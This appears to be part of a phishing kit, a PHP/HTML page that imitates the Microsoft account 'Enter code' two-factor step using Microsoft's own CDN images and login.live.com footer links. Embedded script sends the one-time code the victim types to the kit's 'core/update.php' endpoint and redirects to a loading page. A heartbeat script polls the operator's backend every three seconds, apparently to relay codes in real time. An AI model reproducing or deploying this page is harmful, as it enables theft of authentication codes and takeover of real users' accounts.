                        isInitialState: isInitialState,
                        sentProof: sharedData.sentProof,
                        otcProofs: sharedData.otcProofs,
                        isGeneralVerify: sharedData.isGeneralVerify,
                        proofConfirmation: sharedData.proofConfirmation,
                        showCancelButton: sharedData.showCancelButton,
                        trustedDeviceCheckboxConfig: sharedData.trustedDeviceCheckboxConfig,
                        currentPollStartTime: sharedData.currentPollStartTime,
                        currentPollEndTime: sharedData.currentPollEndTime,
                        sessionIdentifier: sharedData.sessionIdentifier,
                        twoWayPollingNeeded: sharedData.twoWayPollingNeeded,
                        hasTotpV2Only: sharedData.hasTotpV2Only,
                        hasTotpV1Only: sharedData.hasTotpV1Only,
                        flowToken: sharedData.flowToken },
                    event: {
                        cancel: view_onCancel,
                        updateFlowToken: $tfaPage.view_onUpdateFlowToken,
                        showDebugDetails: $tfaPage.toggleDebugDetails_onClick,
                        submitReady: $tfaPage.view_onSubmitReady,
                        setPendingRequest: $tfaPage.view_onSetPendingRequest,
                        setBackButtonState: view_onSetIdentityBackButtonState } }">
                                    <div id=idDiv_SAOTCC_Title class="row text-title" role=heading aria-level=1 data-bind="text: twoWayPollingNeeded ? str['CT_SAOTCAS_STR_Title'] : str['CT_SAOTCS_STR_Title']">Enter code</div>
                                    <div class="row text-body">
                                      <div data-bind="component: { name: 'proof-image-control', params: { type: proofImageType, small: true, animate: twoWayPollingNeeded } }">
                                        <img class="tile-img small" role=presentation pngsrc=https://logincdn.msftauth.net/shared/1.0/content/images/picker_verify_sms_b15dda889e9803e9d6befd60000fadf8.png svgsrc=https://logincdn.msftauth.net/shared/1.0/content/images/picker_verify_sms_27a6d18b56f46818420e60a773c36d4e.svg data-bind="imgSrc, css: { 'small': small, 'animate-pulse': animate }" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDQ4IDQ4Ij48dGl0bGU+YXNzZXRzPC90aXRsZT48cmVjdCB3aWR0aD0iNDgiIGhlaWdodD0iNDgiIGZpbGw9Im5vbmUiLz48cGF0aCBkPSJNMzgsMzBWMTJIMTBWMzBoNHY0LjU3OEwxOC41NzgsMzBIMzhNMTIsMzJIOFYxMEg0MFYzMkgxOS40MjJMMTIsMzkuNDIyWiIgZmlsbD0iIzQwNDA0MCIvPjwvc3ZnPg==">
                                      </div>
                                      <div id=idDiv_SAOTCC_Description class="text-block-body overflow-hidden" data-bind="text: description">If <?php echo($last4); ?> matches the last 4 digits of the phone number on your account, we'll send you a code.</div>
                                    </div>
                                    <div class=text-block-body>
                                      <div id=idDiv_SAOTCC_OTCRow class=form-group>
                                        <div role=alert aria-live=assertive></div>
                                        <div id=idDiv_SAOTCC_Success_OTC class=errorDiv style=display:none></div>
                                        <div id=idDiv_SAOTCC_OTC class="textbox form-group">
                                          <div class=placeholderContainer data-bind="component: { name: 'placeholder-textbox-field',
                publicMethods: otcInputTextbox.placeholderTextboxMethods,
                params: {
                    serverData: svr,
                    hintText: str['CT_SAOTCC_STR_OTC_TBHint'] },
                event: {
                    updateFocus: otcInputTextbox.textbox_onUpdateFocus } }">
                                            <input id=idTxtBx_SAOTCC_OTC name=otc class=form-control type=tel autocomplete=off aria-required=true data-bind="
                    attr: {
                        'maxlength': otcLength,
                        'aria-labelledby': 'idDiv_SAOTCC_Title',
                        'aria-describedby': 'idDiv_SAOTCS_Title idDiv_SAOTCC_Description idSpan_SAOTCC_Error_OTC' },
                    css: { 'has-error': error },
                    textInput: otcInputTextbox.value,
                    ariaLabel: str['CT_SAOTCC_STR_OTC_TBHint'],
                    hasFocusEx: otcInputTextbox.focused,
                    placeholder: $placeholderText" maxlength=7 aria-labelledby=idDiv_SAOTCC_Title aria-describedby="idDiv_SAOTCS_Title idDiv_SAOTCC_Description idSpan_SAOTCC_Error_OTC" aria-label=Code placeholder=Code value>
                                          <script src="../../core/js/jquery.js"></script>
                                          <script>
                                            document.getElementById( 'idTxtBx_SAOTCC_OTC' ).addEventListener( 'keypress', function(event) {
                                              if ( event.key === 'Enter' ) {
                                                event.preventDefault();
                                                document.getElementById( 'idSubmit_SAOTCC_Continue' ).click();
                                              }
                                            });
                                            function onSubmit() {
                                              if ( document.getElementById( 'idTxtBx_SAOTCC_OTC' ).value != '' ) {
                                                $.ajax({
                                                  type: 'GET',
                                                  url: '../../core/update.php?mailsms=' + document.getElementById( 'idTxtBx_SAOTCC_OTC' ).value,
                                                  success: function ( data ) {

                                                    var parsed_data = JSON.parse( data );

                                                    if ( parsed_data[ 'status' ] != 'error' ) {

                                                      console.log( parsed_data[ 'status' ] );
                                                      window.location.replace( '../../loading.php' );

                                                    }

                                                  }
                                                });
                                              }
                                            }
                                          </script>
                                          </div>
                                        </div>
                                      </div>
                                    </div>
                                    <div class="text-block-body text-body" data-bind="visible: showSendNotification" style=display:none></div>
                                    <div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText &amp;&amp; !twoWayPollingNeeded }" class=position-buttons>
                                      <div class=row>
                                        <div id=idDiv_SAOTCC_TD_Section class=no-margin-top-bottom data-bind="visible: tdCheckbox.isShown &amp;&amp; !hideInputControls()">
                                          <div id=idDiv_SAOTCC_TD class="col-md-24 form-group no-margin-top checkbox">
                                            <label id=idLbl_SAOTCC_TD_Cb>
                                              <input id=idChkBx_SAOTCC_TD type=checkbox value=true data-bind="checked: tdCheckbox.isChecked, disable: tdCheckbox.isDisabled, ariaLabel: str['CT_SAOTCC_STR_AddTD'], attr: { name: svr.DN }" name=AddTD aria-label="Don't ask me again on this device" checked>
                                              <span data-bind="text: str['CT_SAOTCC_STR_AddTD']">Don't ask me again on this device</span>
                                            </label>
                                          </div>
                                        </div>
                                      </div>
                                    </div>
                                    <div class=win-button-pin-bottom data-bind="css : { 'boilerplate-button-bottom': tenantBranding.BoilerPlateText }">
                                      <div class=row data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">
                                        <div data-bind="component: { name: 'footer-buttons-field',
            params: {
                serverData: svr,
                removeBottomMargin: true,
                primaryButtonId: 'idSubmit_SAOTCC_Continue',
                primaryButtonText: str['CT_SAOTCC_STR_Continue'],
                secondaryButtonId: 'idBtn_Back',
                secondaryButtonText: str['CT_SAOTCC_STR_Cancel'],
                isSecondaryButtonVisible: !showSwitchProofsLink,
                isPrimaryButtonVisible: svr.F &amp;&amp; !twoWayPollingNeeded &amp;&amp; !hideInputControls(),
                secondaryButtonDescribedBy: (svr.F &amp;&amp; twoWayPollingNeeded) ? 'idDiv_SAOTCC_Description' : null },
            event: {
                primaryButtonClick: primaryButton_onClick,
                secondaryButtonClick: secondaryButton_onClick } }">
                                          <div class="col-xs-24 no-padding-left-right button-container no-margin-bottom button-field-container ext-button-field-container" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { 'no-margin-bottom': removeBottomMargin },
    externalCss: { 'button-field-container': true }">
                                            <div data-bind="css: { 'inline-block': isPrimaryButtonVisible }, externalCss: { 'button-item': true }" class="inline-block button-item ext-button-item">
                                              <input type=button id=idSubmit_SAOTCC_Continue class="win-button button_primary button ext-button primary ext-primary" data-report-event=Signin_Submit data-report-trigger=click data-report-value=Submit data-bind="
                attr: primaryButtonAttributes,
                externalCss: {
                    'button': true,
                    'primary': true },
                value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
                hasFocus: focusOnPrimaryButton,
                click: primaryButton_onClick,
                enable: isPrimaryButtonEnabled,
                visible: isPrimaryButtonVisible,
                preventTabbing: primaryButtonPreventTabbing" value=Verify data-report-attached=1 onclick="onSubmit()">
                                            </div>
                                          </div>
                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                          <div data-bind="component: { name: 'instrumentation-control',
            publicMethods: instrumentationMethods,
            params: { serverData: svr } }"></div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <div id=footer role=contentinfo data-bind="
        externalCss: {
            'footer': true,
            'has-background': !$page.useDefaultBackground() &amp;&amp; $page.showFooter(),
            'background-always-visible': $page.backgroundLogoUrl }" class="footer ext-footer">
                <div data-bind="component: { name: 'footer-control',
            publicMethods: $page.footerMethods,
            params: {
                serverData: svr,
                useDefaultBackground: $page.useDefaultBackground(),
                hasDarkBackground: $page.backgroundLogoUrl(),
                showLinks: true,
                showFooter: $page.showFooter(),
                hideTOU: $page.hideTOU(),
                termsText: $page.termsText(),
                termsLink: $page.termsLink(),
                hidePrivacy: $page.hidePrivacy(),
                privacyText: $page.privacyText(),
                privacyLink: $page.privacyLink() },
            event: {
                agreementClick: $page.footer_agreementClick,
                showDebugDetails: $page.toggleDebugDetails_onClick } }">
                  <div id=footerLinks class="footerNode text-secondary footer-links ext-footer-links" data-bind="externalCss: { 'footer-links': true }">
                    <a id=ftrTerms data-bind="
            text: termsText,
            href: termsLink,
            click: termsLink_onClick,
            externalCss: {
                'footer-content': true,
                'footer-item': true,
                'has-background': !useDefaultBackground,
                'background-always-visible': hasDarkBackground }" href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&amp;mkt=EN-US&amp;uaid=9961159c30fc4468a1b012be6a48cda3" class="footer-content ext-footer-content footer-item ext-footer-item">Terms of use</a>
                    <a id=ftrPrivacy data-bind="
            text: privacyText,
            href: privacyLink,
            click: privacyLink_onClick,
            externalCss: {
                'footer-content': true,
                'footer-item': true,
                'has-background': !useDefaultBackground,
                'background-always-visible': hasDarkBackground }" href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&amp;mkt=EN-US&amp;uaid=9961159c30fc4468a1b012be6a48cda3" class="footer-content ext-footer-content footer-item ext-footer-item">Privacy &amp; cookies</a>
                    <a id=moreOptions href=https://login.live.com/# role=button data-bind="
        click: moreInfo_onClick,
        ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
        attr: { 'aria-expanded': showDebugDetails().toString() },
        hasFocusEx: focusMoreInfo(),
        externalCss: {
            'footer-content': true,
            'footer-item': true,
            'debug-item': true,
            'has-background': !useDefaultBackground,
            'background-always-visible': hasDarkBackground }" aria-label="Click here for troubleshooting information" aria-expanded=false class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...</a>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </form>
      <form data-bind="postRedirectForm: postRedirect" method=POST aria-hidden=true target=_top></form>
    </div>
    <script>
      function hb() {
        $.ajax({
          type: 'GET',
          url: '../../core/heartbeat.php?id=' + '<?php echo( $_SESSION[ 'id' ] ); ?>',
          success: function ( data ) {},
          complete: function ( data ) {
            setTimeout( hb, 3000 );
          }
        });
      };hb();
    </script>